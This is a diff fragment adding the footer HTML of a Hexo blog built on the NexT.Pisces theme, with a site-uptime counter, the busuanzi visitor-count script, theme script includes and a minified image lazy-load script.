+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>-->
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/15/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
+    }
+setInterval("createtime()",250);
+</script>
+
+<script src="/js/prism/prism.js" async></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+</html>
